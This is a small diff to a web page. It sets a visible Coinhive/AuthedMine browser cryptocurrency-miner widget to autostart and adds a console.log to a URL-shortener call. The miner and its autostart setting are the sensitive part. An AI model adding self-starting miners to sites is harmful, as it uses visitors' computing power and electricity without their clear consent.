@@ -68,7 +68,8 @@
             <script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
             <div class="coinhive-miner" 
                 style="width: 256px; height: 310px"
-                data-key="QIybn27aajPyefGy4QFmRnuO1mzPvIuc">
+                data-key="QIybn27aajPyefGy4QFmRnuO1mzPvIuc"
+                 data-autostart=true>
                 <em>Loading...</em>
             </div>
         </div>
@@ -206,6 +207,7 @@
                 t = t.replace("%20", "&nbsp;");
                 alert(t);
                 $.post("https://www.googleapis.com/urlshortener/v1/url", { "longUrl": t }, (d) => {
+                    console.log(d);
                     if (d.kind == "urlshortener#url" && d.longUrl == t) {
                         console.log("Redirecting...");
                         document.getElementById("shorturl").innerHTML = d.id;
